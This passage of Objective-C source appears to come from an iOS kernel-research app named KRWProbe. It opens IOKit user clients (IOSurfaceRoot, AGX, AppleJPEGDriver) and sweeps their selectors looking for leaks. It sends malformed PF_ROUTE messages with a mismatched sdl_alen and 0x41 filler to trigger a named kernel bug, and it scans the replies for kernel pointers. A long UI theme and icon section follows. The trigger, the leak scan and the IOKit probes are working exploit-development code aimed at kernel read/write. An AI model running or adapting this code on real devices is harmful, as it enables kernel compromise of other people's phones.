            if (!svc) { ss_emit(@"[GATES] %@: no service", @(gGateServices[s])); continue; }
            for (uint32_t t = 0; t <= 8 && !gStop; t++) {
                io_connect_t conn = 0;
                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &conn);
                if (kr == KERN_SUCCESS && conn) {
                    ss_emit(@"[GATES] %@ type %u: OPEN conn=0x%x",
                            @(gGateServices[s]), t, conn);
                    // One calibrated external method probe (sel 0, empty)
                    // just to see if dispatch works at all:
                    uint64_t sc0 = 0; size_t olen = 0;
                    kern_return_t kr2 = IOConnectCallMethod(conn, 0,
                        &sc0, 1, NULL, 0, NULL, 0, NULL, &olen);
                    ss_emit(@"[GATES]   sel0 probe: kr=0x%x", kr2);
                    IOServiceClose(conn);
                } else {
                    ss_emit(@"[GATES] %@ type %u: kr=0x%x",
                            @(gGateServices[s]), t, kr);
                }
            }
            IOObjectRelease(svc);
            set_phase(@"GATES %d/%d", s + 1, kGateServiceCount);
        }
    }
    ss_emit(@"[GATES] done");

    // 2.2: GMAP lives here, not in SELSCAN, so a selector crash and a global
    // surface crash are separated.  No IOSurfaceLookup/map/read: the 2.1
    // build died on a foreign surface dereference.  Header-only analysis.
    io_connect_t gconn = leak_open_conn();
    if (!gconn) {
        ss_emit(@"[GATES] GMAP: no IOSurfaceRoot connection");
    } else {
        if (!gStop) {
            ss_emit(@"[GATES] GMAP sel7 address-range tests (no map/read)");
            ss_addr_range_tests(gconn);
        }
        if (!gStop) {
            ss_emit(@"[GATES] GMAP sel4 global sweep ids 1..0xfff (no map/read)");
            ss_global_lookup_sweep(gconn, 0x1000);
        }
        IOServiceClose(gconn);
    }
    if (!gStop) {
        ss_emit(@"[GATES] AGX type 1 table scan");
        agx_type1_scan();
    }
    if (!gStop) {
        ss_emit(@"[GATES] AGX sel0/2/4/5 user-VA probe");
        agx_map_probe();
    }
    if (!gStop) {
        ss_emit(@"[GATES] AGX sel8 new_resource with real IOSurface");
        agx_new_resource_probe();
    }
    if (!gStop) {
        ss_emit(@"[GATES] AGX sel6 command-queue size sweep 0x408..0x8000");
        agx_cmd_queue_sweep2();
    }
    if (!gStop) {
        ss_emit(@"[GATES] AppleJPEGDriver selector leak sweep");
        jpeg_leak_probe();
    }
}

static void gates_loop(void) {
    if (gSSBusy) { L(@"[GATES] already running"); return; }
    gSSBusy = 1; gStop = 0;
    @autoreleasepool { gates_loop_inner(); }
    gSSBusy = 0;
}



// ============================================================================
//  2.0 — PATH-A probe for the 26.6.x line (23G71/23G82, xnu-12377.162.14)
//
//  KCORE_FIX_AUDIT F1/F3: rt_setgate AF_LINK gateway validation
//  (CVE-2026-112507) and the NECP/CFIL DATA-TRACE sanitizer
//  (CVE-2026-112665) landed in 26.7.2 + 27.2.  Static check on the 26.6
//  (23G71) kernelcache: the debug assertion "sdl->sdl_alen == size" is
//  still present (removed by the fix in 27.2), the fix-shaped reject
//  messages are absent.  => both bugs are expected LIVE on 26.6.1.
//
//  ROUTE: socket(PF_ROUTE) + RTM_ADD with an AF_LINK gateway whose
//  sdl_alen exceeds the bytes actually present (sdl_len stays 16).
//  On a PATCHED kernel rt_setgate rejects the gateway; on a VULNERABLE
//  kernel the route is installed with the lying metadata.  Levels:
//    0 = control, alen=6 (consistent with 16-byte sdl)
//    1 = alen=32 (mismatch, safe — route deleted immediately)
//    2 = alen=0xf7 (max the fix allows; needs route-cap file)
//  After every successful ADD the route is read back (RTM_GET) and
//  deleted (RTM_DELETE).  The reply is scanned for kernel pointers.
//
//  NECP: necp_open (SYS 501 on 26.6) + necp_client_action (SYS 502,
//  action 1 = ADD) — reachability only; the DATA-TRACE print goes to the
//  kernel log, which an app cannot read directly (recorded for the
//  sysdiagnose workflow).
// ============================================================================

// ---- route (PF_ROUTE) ----
#define AF_ROUTE_D      17
#define SOCK_RAW_D      3
#define RTM_VERSION_D   5
#define RTM_ADD_D       1
#define RTM_DELETE_D    2
#define RTM_GET_D       4
#define RTA_DST_D       0x1
#define RTA_GATEWAY_D   0x2
#define RTA_NETMASK_D   0x4
#define RTF_UP_D        0x1
#define RTF_GATEWAY_D   0x2
#define RTF_STATIC_D    0x8
#define RTF_HOST_D      0x4

typedef struct {
    uint16_t rtm_msglen;
    uint8_t  rtm_version;
    uint8_t  rtm_type;
    uint16_t rtm_index;
    uint16_t rtm_flags;
    uint16_t rtm_addrs;
    int32_t  rtm_pid;
    int32_t  rtm_seq;
    int32_t  rtm_errno;
    int32_t  rtm_use;
    uint32_t rtm_inits;
    uint64_t rmx[9];          // rt_metrics (arm64: 9 x u_long)
} rt_msghdr_d;                // 104 bytes

static NSLock *gRtLock;
static FILE *gRtFile;
static NSString *gRtPath;
static volatile int gRtBusy;

static void rt_emit(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *body = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (!body) body = @"(log format failed)";
    if (!gRtLock) gRtLock = [[NSLock alloc] init];
    [gRtLock lock];
    if (gRtFile) {
        const char *u = body.UTF8String;
        if (u) { fwrite(u, 1, strlen(u), gRtFile); fputc('\n', gRtFile); fflush(gRtFile); }
    }
    L(@"%@", body);
    [gRtLock unlock];
}

static void rt_hexdump(const char *tag, const uint8_t *p, size_t n) {
    if (n > 0x120) n = 0x120;
    NSMutableString *s = [NSMutableString string];
    for (size_t i = 0; i < n; i += 16) {
        [s appendFormat:@"  +0x%03zx:", i];
        for (size_t j = 0; j < 16 && i + j < n; j++) [s appendFormat:@" %02x", p[i + j]];
        [s appendString:@"\n"];
    }
    rt_emit(@"[%@] %zu bytes:\n%@", @(tag), n, s);
}

// kernel-pointer scan over a route reply (LEAK rule)
static int rt_scan_ptrs(const uint8_t *p, size_t n, char *out, size_t cap) {
    int hits = 0; out[0] = 0;
    for (size_t i = 0; i + 8 <= n; i += 4) {
        uint64_t v; memcpy(&v, p + i, 8);
        BOOL ktext = (v >= 0xfffffff007004000ULL && v < 0xfffffff00aa78000ULL);
        BOOL krange = (v >= 0xfffffff000000000ULL && v < 0xfffffff800000000ULL);
        BOOL sx32 = (v >= 0xffffffff80000000ULL && v <= 0xffffffffffffffffULL);
        if (ktext || (krange && !sx32)) {
            hits++;
            char line[96];
            snprintf(line, sizeof(line), "+0x%zx=0x%016llx%s ", i,
                     (unsigned long long)v, ktext ? "[TEXT]" : "[K]");
            if (strlen(out) + strlen(line) < cap) strlcat(out, line, cap);
        }
    }
    return hits;
}

// build one rt_msghdr message; gw_alen < 0 = omit gateway (control without gw)
static size_t rt_build(uint8_t *buf, size_t cap, uint8_t type, uint16_t flags,
                       uint32_t dst_be, int gw_alen, uint16_t ifindex) {
    memset(buf, 0, 256);
    rt_msghdr_d *m = (rt_msghdr_d *)buf;
    size_t off = sizeof(rt_msghdr_d);
    // RTA_DST (sockaddr_in, 16 bytes)
    buf[off + 0] = 16; buf[off + 1] = 2;                     // sa_len, AF_INET
    uint32_t a = OSSwapHostToBigInt32(dst_be);
    memcpy(buf + off + 4, &a, 4);
    off += 16;
    uint16_t addrs = RTA_DST_D;
    if (gw_alen >= 0) {
        // RTA_GATEWAY: sockaddr_dl, total 16 bytes, sdl_alen lies
        buf[off + 0] = 16;                                   // sdl_len (bytes present)
        buf[off + 1] = 18;                                   // AF_LINK
        *(uint16_t *)(buf + off + 2) = ifindex;
        buf[off + 4] = 6;                                    // sdl_type = IFT_ETHER
        buf[off + 5] = 0;                                    // sdl_nlen
        buf[off + 6] = (uint8_t)gw_alen;                     // sdl_alen — the lie
        buf[off + 7] = 0;                                    // sdl_slen
        // sdl_data[8]: filler that would overflow if consumed (0x41..)
        for (int i = 0; i < 8; i++) buf[off + 8 + i] = (uint8_t)(0x41 + i);
        off += 16;
        addrs |= RTA_GATEWAY_D;
    }
    // RTA_NETMASK: /32
    buf[off + 0] = 8; buf[off + 1] = 2;
    uint32_t nm = OSSwapHostToBigInt32(0xffffffffu);
    memcpy(buf + off + 4, &nm, 4);
    off += 8;
    addrs |= RTA_NETMASK_D;

    m->rtm_msglen = (uint16_t)off;
    m->rtm_version = RTM_VERSION_D;
    m->rtm_type = type;
    m->rtm_index = ifindex;
    m->rtm_flags = flags | (type == RTM_ADD_D ? (RTF_UP_D | RTF_GATEWAY_D | RTF_STATIC_D | RTF_HOST_D) : 0);
    m->rtm_addrs = addrs;
    m->rtm_pid = getpid();
    static int gRtSeq = 0;
    m->rtm_seq = ++gRtSeq;
    return off;
}

// read one reply with timeout; returns bytes or -1
static ssize_t rt_read_reply(int fd, uint8_t *buf, size_t cap, int want_seq, int timeout_ms) {
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    size_t got = 0;
    while (got < cap) {
        ssize_t n = read(fd, buf + got, cap - got);
        if (n <= 0) break;
        got += (size_t)n;
        // walk messages; return when we see one matching our seq
        size_t p = 0;
        while (p + sizeof(rt_msghdr_d) <= got) {
            rt_msghdr_d *m = (rt_msghdr_d *)(buf + p);
            if (m->rtm_msglen == 0) break;
            if (m->rtm_seq == want_seq) return (ssize_t)got;
            p += m->rtm_msglen;
        }
        if (got >= 4096) break;
    }
    return got ? (ssize_t)got : -1;
}

static void route_loop_inner(void) {
    if (!gRtLock) gRtLock = [[NSLock alloc] init];
    if (!gRtPath && gRunDir) gRtPath = [gRunDir stringByAppendingPathComponent:@"route.txt"];
    gRtFile = gRtPath ? fopen(gRtPath.fileSystemRepresentation, "a") : NULL;
    if (gRtFile) setvbuf(gRtFile, NULL, _IOLBF, 0);
    rt_emit(@"[ROUTE] === KRWProbe %@ route %@ ===", app_version(), [NSDate date]);
    rt_emit(@"[ROUTE] CVE-2026-112507 fix-status test: RTM_ADD AF_LINK gw with sdl_alen > sdl_len."
             " Level 0 = control; 1 = alen 32; 2 = alen 0xf7 (needs route-cap).");

    // level cap from <Documents>/KRWProbe-route.txt ("max_level=N", default 1)
    int maxLevel = 1;
    if (gRtCfgPath) {
        NSString *s = [NSString stringWithContentsOfFile:gRtCfgPath encoding:NSUTF8StringEncoding error:nil];
        if (s) {
            NSRange r = [s rangeOfString:@"max_level="];
            if (r.location != NSNotFound) {
                int v = [s substringFromIndex:NSMaxRange(r)].intValue;
                if (v >= 0 && v <= 2) { maxLevel = v; rt_emit(@"[ROUTE] cap from file: max_level=%d", maxLevel); }
            }
        }
    }

    int fd = socket(AF_ROUTE_D, SOCK_RAW_D, 0);
    if (fd < 0) {
        rt_emit(@"[ROUTE] socket(PF_ROUTE) = -1 errno=%d (%s) — sandbox denies route sockets", errno, strerror(errno));
        rt_emit(@"[ROUTE] verdict: PF_ROUTE unreachable from app sandbox");
        if (gRtFile) { fclose(gRtFile); gRtFile = NULL; }
        return;
    }
    rt_emit(@"[ROUTE] socket(PF_ROUTE) OK fd=%d — route sockets reachable from sandbox", fd);

    struct { const char *name; int level, alen; uint32_t dst; } cases[] = {
        { "L0 control alen=6",  0, 6,  0x0A4D4401 },   // 10.77.68.1
        { "L1 mismatch alen=32", 1, 32, 0x0A4D4402 },
        { "L2 max alen=0xf7",   2, 0xf7, 0x0A4D4403 },
    };
    uint16_t ifx = 1;                                   // lo0 is always index 1
    uint8_t out[4096];
    for (int i = 0; i < 3 && !gStop; i++) {
        @autoreleasepool {
            set_phase(@"ROUTE %d/3", i + 1);
            if (cases[i].level > maxLevel) { rt_emit(@"[ROUTE] %@ skipped (cap=%d)", @(cases[i].name), maxLevel); continue; }
            uint8_t msg[256];
            size_t len = rt_build(msg, sizeof(msg), RTM_ADD_D, 0, cases[i].dst, cases[i].alen, ifx);
            rt_emit(@"[ROUTE] --- %@ (dst %u.%u.%u.%u, sdl_len=16, sdl_alen=%d, msglen=%zu)",
                    @(cases[i].name),
                    (cases[i].dst >> 24) & 0xff, (cases[i].dst >> 16) & 0xff,
                    (cases[i].dst >> 8) & 0xff, cases[i].dst & 0xff,
                    cases[i].alen, len);
            ssize_t w = write(fd, msg, len);
            int we = errno;
            if (w < 0) { rt_emit(@"[ROUTE] RTM_ADD write = -1 errno=%d (%s)", we, strerror(we)); continue; }
            rt_emit(@"[ROUTE] RTM_ADD write = %zd (route message accepted by route socket)", w);
            ssize_t n = rt_read_reply(fd, out, sizeof(out), ((rt_msghdr_d *)msg)->rtm_seq, 1500);
            if (n > 0) {
                rt_msghdr_d *m = (rt_msghdr_d *)out;
                rt_emit(@"[ROUTE] reply: type=%u errno=%d addrs=0x%x msglen=%u",
                        m->rtm_type, m->rtm_errno, m->rtm_addrs, m->rtm_msglen);
                rt_hexdump("route reply", out, (size_t)n);
                char ptrs[512];
                int hits = rt_scan_ptrs(out, (size_t)n, ptrs, sizeof(ptrs));
                rt_emit(@"[ROUTE] reply ptr scan: hits=%d%@", hits,
                        hits ? [NSString stringWithUTF8String:ptrs] : @"");
            } else {
                rt_emit(@"[ROUTE] no reply within 1.5s (errno=%d)", errno);
            }
            // readback via RTM_GET (does the kernel keep the lying gateway?)
            uint8_t get[256];
            size_t glen = rt_build(get, sizeof(get), RTM_GET_D, 0, cases[i].dst, -1, ifx);
            // GET needs dst+netmask mask to match; resend same addrs minus gateway
            write(fd, get, glen);
            ssize_t gn = rt_read_reply(fd, out, sizeof(out), ((rt_msghdr_d *)get)->rtm_seq, 1500);
            if (gn > 0) {
                rt_msghdr_d *m = (rt_msghdr_d *)out;
                rt_emit(@"[ROUTE] RTM_GET: type=%u errno=%d msglen=%u", m->rtm_type, m->rtm_errno, m->rtm_msglen);
                rt_hexdump("route get", out, (size_t)gn);
            } else {
                rt_emit(@"[ROUTE] RTM_GET: no reply");
            }
            // cleanup
            uint8_t del[256];
            size_t dlen = rt_build(del, sizeof(del), RTM_DELETE_D, 0, cases[i].dst, cases[i].alen, ifx);
            write(fd, del, dlen);
            ssize_t dn = rt_read_reply(fd, out, sizeof(out), ((rt_msghdr_d *)del)->rtm_seq, 1500);
            rt_emit(@"[ROUTE] RTM_DELETE: %zd bytes reply, errno=%d",
                    dn, dn > 0 ? ((rt_msghdr_d *)out)->rtm_errno : 0);
        }
    }
    close(fd);
    rt_emit(@"[ROUTE] done — on a PATCHED kernel L1/L2 RTM_ADD replies errno!=0 (gateway rejected);"
             " on a VULNERABLE kernel they install (errno=0) and RTM_GET shows the lying gateway");
    if (gRtFile) { fclose(gRtFile); gRtFile = NULL; }
}

static void route_loop(void) {
    if (gRtBusy) { L(@"[ROUTE] already running"); return; }
    gRtBusy = 1; gStop = 0;
    @autoreleasepool { route_loop_inner(); }
    gRtBusy = 0;
}

// ---- NECP reachability ----
#ifndef SYS_necp_open
#define SYS_necp_open 501
#endif
#ifndef SYS_necp_client_action
#define SYS_necp_client_action 502
#endif

static void necp_loop_inner(void) {
    rt_emit(@"[NECP] === KRWProbe %@ necp %@ ===", app_version(), [NSDate date]);
    rt_emit(@"[NECP] CVE-2026-112665 surface: necp_open(501)/necp_client_action(502) reachability."
             " The DATA-TRACE print lands in the kernel log (not app-readable);"
             " sysdiagnose after this button can carry the <so %%llx> line.");
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
    long fd = syscall(SYS_necp_open, 0);
    if (fd < 0) {
        rt_emit(@"[NECP] necp_open = -1 errno=%d (%s)", errno, strerror(errno));
    } else {
        rt_emit(@"[NECP] necp_open OK fd=%ld", fd);
        // action 1 = NECP_CLIENT_ACTION_ADD: client_id (16B) + minimal parameters
        uint8_t cid[16]; arc4random_buf(cid, 16);
        uint8_t params[64]; memset(params, 0, sizeof(params));
        params[0] = 1; // minimal parameter count / first byte
        long r = syscall(SYS_necp_client_action, fd, 1, cid, (unsigned long)sizeof(cid),
                         params, (unsigned long)sizeof(params));
        #pragma clang diagnostic pop
        rt_emit(@"[NECP] necp_client_action(ADD) = %ld errno=%d", r, r < 0 ? errno : 0);
        // a real connect() while the client exists forces policy evaluation
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s >= 0) {
            struct sockaddr_in sa; memset(&sa, 0, sizeof(sa));
            sa.sin_len = sizeof(sa); sa.sin_family = AF_INET; sa.sin_port = htons(80);
            sa.sin_addr.s_addr = inet_addr("10.255.255.1");
            int c = connect(s, (struct sockaddr *)&sa, sizeof(sa));
            rt_emit(@"[NECP] connect() under necp client = %d errno=%d", c, c < 0 ? errno : 0);
            close(s);
        }
        close((int)fd);
    }
    rt_emit(@"[NECP] done");
}

static void necp_loop(void) {
    if (gRtBusy) { L(@"[NECP] already running"); return; }
    gRtBusy = 1; gStop = 0;
    @autoreleasepool { necp_loop_inner(); }
    gRtBusy = 0;
}
//  UI 1.8 — "Nyxt" inspired dark-slate interface.
//  Everything below is presentation only; the probe entry points are the same
//  selectors that were wired in 1.7.
// ============================================================================

#pragma mark - Theme

static UIColor *KRWColor(CGFloat r, CGFloat g, CGFloat b) {
    return [UIColor colorWithRed:r / 255.0 green:g / 255.0 blue:b / 255.0 alpha:1.0];
}
static UIColor *KRWColorA(CGFloat r, CGFloat g, CGFloat b, CGFloat a) {
    return [UIColor colorWithRed:r / 255.0 green:g / 255.0 blue:b / 255.0 alpha:a];
}
static UIColor *KRWAccent(void)      { return KRWColor(167, 139, 250); }
static UIColor *KRWAccentDeep(void)  { return KRWColor(124, 92, 255); }
static UIColor *KRWBG(void)          { return KRWColor(30, 34, 41); }
static UIColor *KRWCard(void)        { return KRWColor(38, 42, 51); }
static UIColor *KRWTile(void)        { return KRWColor(47, 52, 62); }
static UIColor *KRWText(void)        { return KRWColor(242, 244, 248); }
static UIColor *KRWSub(void)         { return KRWColor(154, 161, 174); }
static UIColor *KRWMute(void)        { return KRWColor(112, 119, 130); }
static UIColor *KRWGreen(void)       { return KRWColor(126, 226, 184); }
static UIColor *KRWRed(void)         { return KRWColor(255, 122, 122); }
static UIColor *KRWAmber(void)       { return KRWColor(245, 197, 107); }
static UIColor *KRWPink(void)        { return KRWColor(244, 114, 182); }
static UIColor *KRWTeal(void)        { return KRWColor(94, 234, 212); }
static UIColor *KRWBlue(void)        { return KRWColor(96, 165, 250); }
static UIColor *KRWTelegramBlue(void){ return KRWColor(42, 171, 238); }

static UIFont *KRWFont(UIFontTextStyle style, CGFloat size, UIFontWeight weight, CGFloat cap) {
    UIFont *base = [UIFont systemFontOfSize:size weight:weight];
    UIFontMetrics *metrics = [UIFontMetrics metricsForTextStyle:style];
    return cap > 0.0 ? [metrics scaledFontForFont:base maximumPointSize:cap]
                     : [metrics scaledFontForFont:base];
}
static UIFont *KRWMono(CGFloat size, UIFontWeight weight, CGFloat cap) {
    UIFont *base = [UIFont monospacedSystemFontOfSize:size weight:weight];
    return [[UIFontMetrics metricsForTextStyle:UIFontTextStyleCaption2]
            scaledFontForFont:base maximumPointSize:cap];
}
static UILabel *KRWLabel(NSString *text, UIFont *font, UIColor *color) {
    UILabel *label = [[UILabel alloc] init];
    label.translatesAutoresizingMaskIntoConstraints = NO;
    label.text = text;
    label.font = font;
    label.textColor = color;
    label.backgroundColor = [UIColor clearColor];
    return label;
}
static NSAttributedString *KRWTracked(NSString *text, UIFont *font,
                                      UIColor *color, CGFloat kern) {
    NSMutableParagraphStyle *p = [[NSMutableParagraphStyle alloc] init];
    p.alignment = NSTextAlignmentLeft;
    return [[NSAttributedString alloc] initWithString:text
                                           attributes:@{ NSFontAttributeName: font,
                                                         NSForegroundColorAttributeName: color,
                                                         NSKernAttributeName: @(kern),
                                                         NSParagraphStyleAttributeName: p }];
}
static UIView *KRWSeparator(void) {
    UIView *v = [[UIView alloc] init];
    v.translatesAutoresizingMaskIntoConstraints = NO;
    v.backgroundColor = KRWColorA(255, 255, 255, 0.06);
    CGFloat hair = 1.0 / MAX(1.0, [UIScreen mainScreen].scale);
    [v.heightAnchor constraintEqualToConstant:hair].active = YES;
    return v;
}
static void KRWOpenURL(NSString *string) {
    if (string.length == 0) return;
    NSURL *url = [NSURL URLWithString:string];
    if (!url) return;
    UIApplication *app = [UIApplication sharedApplication];
    [app openURL:url options:@{} completionHandler:nil];
}

#pragma mark - Small drawing helpers

// ----------------------------------------------------------------------------
// GitHub mark.  The official path is 24x24; the tiny SVG parser below only
// needs the commands used by it (M/m, L/l, H/h, V/v, C/c, S/s, Q/q, T/t, Z/z).
// That keeps the icon crisp at any size and avoids shipping a raster asset.
// ----------------------------------------------------------------------------
static BOOL KRWSVGNumber(const char **cursor, CGFloat *out) {
    const char *p = *cursor;
    while (*p && (isspace((unsigned char)*p) || *p == ',')) p++;
    if (!*p || isalpha((unsigned char)*p)) { *cursor = p; return NO; }
    char *end = NULL;
    double value = strtod(p, &end);
    if (end == p) { *cursor = p + 1; return NO; }
    *out = (CGFloat)value;
    *cursor = end;
    return YES;
}
static CGPathRef KRWCreateGitHubPath(void) {
    static const char *d =
        "M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385"
        ".6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61"
        "-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729"
        ".084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305"
        " 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93"
        " 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005"
        "-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405"
        " 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84"
        " 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096"
        ".81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57"
        "C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12";

    CGMutablePathRef path = CGPathCreateMutable();
    const char *p = d;
    char command = 0;
    CGPoint current = CGPointZero, start = CGPointZero, previousControl = CGPointZero;
    BOOL hasPreviousControl = NO;

    while (*p) {
        while (*p && (isspace((unsigned char)*p) || *p == ',')) p++;
        if (!*p) break;
        if (isalpha((unsigned char)*p)) command = *p++;
        if (!command) { p++; continue; }

        char c = (char)tolower((unsigned char)command);
        BOOL relative = (command >= 'a' && command <= 'z');
        if (c == 'z') {
            CGPathCloseSubpath(path);
            current = start;
            hasPreviousControl = NO;
            command = 0;
            continue;
        }
        if (c == 'm') {
            CGFloat x = 0, y = 0;
            if (!KRWSVGNumber(&p, &x) || !KRWSVGNumber(&p, &y)) { command = 0; continue; }
            if (relative) { x += current.x; y += current.y; }
            CGPathMoveToPoint(path, NULL, x, y);
            current = start = CGPointMake(x, y);
            command = relative ? 'l' : 'L';
            hasPreviousControl = NO;
            continue;
        }
        if (c == 'l' || c == 't') {
            CGFloat x = 0, y = 0;
            if (!KRWSVGNumber(&p, &x) || !KRWSVGNumber(&p, &y)) { command = 0; continue; }
            CGPoint control = previousControl;
            if (c == 't') {
                control = hasPreviousControl
                    ? CGPointMake(2 * current.x - previousControl.x,
                                  2 * current.y - previousControl.y)
                    : current;
            }
            if (relative) { x += current.x; y += current.y; }
            if (c == 't') {
                CGPathAddQuadCurveToPoint(path, NULL, control.x, control.y, x, y);
            } else {
                CGPathAddLineToPoint(path, NULL, x, y);
            }
            current = CGPointMake(x, y);
            previousControl = control;
            hasPreviousControl = (c == 't');
            continue;
        }
        if (c == 'h') {
            CGFloat x = 0;
            if (!KRWSVGNumber(&p, &x)) { command = 0; continue; }
            if (relative) x += current.x;
            CGPathAddLineToPoint(path, NULL, x, current.y);
            current.x = x;
            hasPreviousControl = NO;
            continue;
        }
        if (c == 'v') {
            CGFloat y = 0;
            if (!KRWSVGNumber(&p, &y)) { command = 0; continue; }
            if (relative) y += current.y;
            CGPathAddLineToPoint(path, NULL, current.x, y);
            current.y = y;
            hasPreviousControl = NO;
            continue;
        }
        if (c == 'c' || c == 's') {
            CGFloat x1 = 0, y1 = 0, x2 = 0, y2 = 0, x = 0, y = 0;
            if (c == 'c') {
                if (!KRWSVGNumber(&p, &x1) || !KRWSVGNumber(&p, &y1)) { command = 0; continue; }
            } else {
                x1 = hasPreviousControl ? 2 * current.x - previousControl.x : current.x;
                y1 = hasPreviousControl ? 2 * current.y - previousControl.y : current.y;
            }
            if (!KRWSVGNumber(&p, &x2) || !KRWSVGNumber(&p, &y2) ||
                !KRWSVGNumber(&p, &x) || !KRWSVGNumber(&p, &y)) { command = 0; continue; }
            if (relative) {
                x1 += current.x; y1 += current.y;
                x2 += current.x; y2 += current.y;
                x += current.x; y += current.y;
            }
            CGPathAddCurveToPoint(path, NULL, x1, y1, x2, y2, x, y);
            previousControl = CGPointMake(x2, y2);
            hasPreviousControl = YES;
            current = CGPointMake(x, y);
            continue;
        }
        if (c == 'q') {
            CGFloat x1 = 0, y1 = 0, x = 0, y = 0;
            if (!KRWSVGNumber(&p, &x1) || !KRWSVGNumber(&p, &y1) ||
                !KRWSVGNumber(&p, &x) || !KRWSVGNumber(&p, &y)) { command = 0; continue; }
            if (relative) {
                x1 += current.x; y1 += current.y;
                x += current.x; y += current.y;
            }
            CGPathAddQuadCurveToPoint(path, NULL, x1, y1, x, y);
            previousControl = CGPointMake(x1, y1);
            hasPreviousControl = YES;
            current = CGPointMake(x, y);
            continue;
        }
        // Unknown command: consume one number so the parser can recover.
        CGFloat ignored = 0;
        if (!KRWSVGNumber(&p, &ignored)) command = 0;
    }
    return path;
}

@interface KRWGitHubIconView : UIView
@end
@implementation KRWGitHubIconView
- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.backgroundColor = [UIColor clearColor];
        self.opaque = NO;
        self.userInteractionEnabled = NO;
        self.tintColor = [UIColor whiteColor];
    }
    return self;
}
- (void)tintColorDidChange {
    [super tintColorDidChange];
    [self setNeedsDisplay];
}
- (void)drawRect:(CGRect)rect {
    CGContextRef ctx = UIGraphicsGetCurrentContext();
    if (!ctx) return;
    CGPathRef raw = KRWCreateGitHubPath();
    CGRect box = CGPathGetPathBoundingBox(raw);
    if (box.size.width <= 0 || box.size.height <= 0) { CGPathRelease(raw); return; }

    CGFloat scale = MIN(rect.size.width / box.size.width,
                        rect.size.height / box.size.height);
    CGAffineTransform transform = CGAffineTransformMakeScale(scale, scale);
    transform = CGAffineTransformTranslate(transform, -box.origin.x, -box.origin.y);
    CGPathRef scaled = CGPathCreateCopyByTransformingPath(raw, &transform);

    CGContextSaveGState(ctx);
    CGContextTranslateCTM(ctx,
                          CGRectGetMidX(rect) - (box.size.width * scale) / 2.0,
                          CGRectGetMidY(rect) - (box.size.height * scale) / 2.0);
    CGContextAddPath(ctx, scaled);
    CGContextSetFillColorWithColor(ctx, self.tintColor.CGColor);
    CGContextFillPath(ctx);
    CGContextRestoreGState(ctx);

    CGPathRelease(scaled);
    CGPathRelease(raw);
}
@end

static UIView *KRWGitHubIcon(CGFloat size) {
    KRWGitHubIconView *github = [[KRWGitHubIconView alloc] initWithFrame:CGRectZero];
    github.translatesAutoresizingMaskIntoConstraints = NO;
    [github.widthAnchor constraintEqualToConstant:size].active = YES;
    [github.heightAnchor constraintEqualToConstant:size].active = YES;
    return github;
}
static UIImageView *KRWSymbolIcon(NSString *name, UIColor *tint, CGFloat size) {
    UIImage *image = [UIImage systemImageNamed:name];
    if (!image) image = [UIImage systemImageNamed:@"circle.fill"];
    image = [image imageWithRenderingMode:UIImageRenderingModeAlwaysTemplate];
    UIImageView *view = [[UIImageView alloc] initWithImage:image];
    view.translatesAutoresizingMaskIntoConstraints = NO;
    view.contentMode = UIViewContentModeScaleAspectFit;
    view.tintColor = tint;
    [view.widthAnchor constraintEqualToConstant:size].active = YES;
    [view.heightAnchor constraintEqualToConstant:size].active = YES;
    return view;
}
static UIView *KRWCreditsIcons(CGFloat size) {
    UIView *github = KRWGitHubIcon(size);
    UIImageView *telegram = KRWSymbolIcon(@"paperplane.fill", KRWTelegramBlue(), size);
    if (!telegram.image) {
        telegram.image = [UIImage systemImageNamed:@"send.fill"];
        telegram.tintColor = KRWTelegramBlue();
    }

    UIStackView *row = [[UIStackView alloc] initWithArrangedSubviews:@[ github, telegram ]];
    row.translatesAutoresizingMaskIntoConstraints = NO;
    row.axis = UILayoutConstraintAxisHorizontal;
    row.alignment = UIStackViewAlignmentCenter;
    row.spacing = MAX(3.0, size * 0.24);
    [row.widthAnchor constraintEqualToConstant:size * 2.0 + row.spacing].active = YES;
    [row.heightAnchor constraintEqualToConstant:size].active = YES;
    return row;
}

#pragma mark - Building blocks

@interface KRWCardView : UIView
@end
@implementation KRWCardView
- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.translatesAutoresizingMaskIntoConstraints = NO;
        self.backgroundColor = KRWCard();
        self.layer.cornerRadius = 22.0;
        self.layer.cornerCurve = kCACornerCurveContinuous;
        self.layer.borderWidth = 0.5;
        self.layer.borderColor = KRWColorA(255, 255, 255, 0.055).CGColor;
        self.layer.shadowColor = [UIColor blackColor].CGColor;
        self.layer.shadowOpacity = 0.16;
        self.layer.shadowRadius = 18.0;
        self.layer.shadowOffset = CGSizeMake(0, 8);
    }
    return self;
}
- (void)layoutSubviews {
    [super layoutSubviews];
    self.layer.shadowPath = [UIBezierPath bezierPathWithRoundedRect:self.bounds
                                                       cornerRadius:self.layer.cornerRadius].CGPath;
}
@end

@interface KRWStatusDot : UIView
- (void)startPulse;
- (void)pop;
@end
@implementation KRWStatusDot
- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.translatesAutoresizingMaskIntoConstraints = NO;
        self.userInteractionEnabled = NO;
        self.backgroundColor = KRWAccent();
        self.layer.shadowColor = KRWAccent().CGColor;
